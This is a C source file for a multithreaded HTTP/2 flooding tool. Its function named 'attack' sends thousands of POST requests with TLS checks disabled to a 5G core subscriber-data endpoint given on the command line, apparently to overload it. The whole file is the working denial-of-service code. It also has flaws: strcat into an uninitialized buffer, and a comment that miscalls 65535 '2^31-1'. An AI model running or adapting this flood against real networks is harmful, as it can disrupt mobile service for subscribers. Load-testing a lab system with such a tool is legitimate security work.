#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include<string.h>
#include <curl/curl.h>
#include <pthread.h>

typedef struct {
    char* url;
    int number_of_packets;
        int id_thread;

} thread_args_t;



void* attack(void*args);

int main(int argc, char *argv[])
{
  if(argc!= 4){
printf("Insert url,number_of_packets,number_of_threads\n");
printf("Example: ./main_curl https://localhost:8000 10000 100\n");
exit(1);
  }

  int number_of_packets = atoi(argv[2]);
  int number_of_threads = atoi(argv[3]);
  printf("Number packets  %d",number_of_packets);

  char url[100];
  char path[]="/nudm-sdm/v2/imsi-460020301001001?dataset-names=AM,SMF_SEL";

  strcat(url,argv[1]);
  strcat(url,path);
  printf("Url  %s\n",  url);

    pthread_t threads[number_of_threads];
    thread_args_t thread_args[number_of_threads];

    int rc, i;

    // Create threads
    for (i = 0; i < number_of_threads; i++) {
          thread_args[i].number_of_packets=number_of_packets;
         thread_args[i].url=url;
         thread_args[i].id_thread=i;
        rc = pthread_create(&threads[i], NULL, attack, &thread_args[i]);
        if (rc) {
            printf("Error: return code from pthread_create() is %d\n", rc);
            return 1;
        }
    }

    // Join threads
    for (i = 0; i < number_of_threads; i++) {
        rc = pthread_join(threads[i], NULL);
        if (rc) {
            printf("Error: return code from pthread_join() is %d\n", rc);
            return 1;
        }
    }


  return 0;
}
void* attack(void *arg){

  thread_args_t *thread_args = (thread_args_t*)arg;

      printf("Thread %d started \n", thread_args->id_thread);

  CURL *curl;
  CURLcode res;

  struct curl_slist *headers = NULL;
// Initialize the libcurl library
  curl_global_init(CURL_GLOBAL_ALL);

  // Create a new curl handle
  curl = curl_easy_init();
  if (curl) {
    // Set the URL to send the request to
    curl_easy_setopt(curl, CURLOPT_URL, thread_args->url);
    curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);
    //disable ssl certificate validation
  curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
  curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);

    

      char payload[4096] = { 0 };
        curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE_LARGE, (curl_off_t)4096);
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, payload);

  long window_size_increment = 65535; // Set the window size increment to maximum size, 2^31-1

    // // Add a custom header to the request to send the window size increment
    char header[128];
    sprintf(header, "Window-Size-Increment: %ld", window_size_increment);
    headers = curl_slist_append(headers, header);
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);

    // Set the HTTP/2 version to use
    curl_easy_setopt(curl, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_2_0);
    for(int i=0;i<thread_args->number_of_packets;i++){
          res = curl_easy_perform(curl);
          if (res != CURLE_OK) {
             fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
       }
    }
    // Perform the request
      

    // Cleanup
    curl_slist_free_all(headers);
    curl_easy_cleanup(curl);
  

  // Cleanup the libcurl library
  curl_global_cleanup();

  }
      pthread_exit(NULL);
}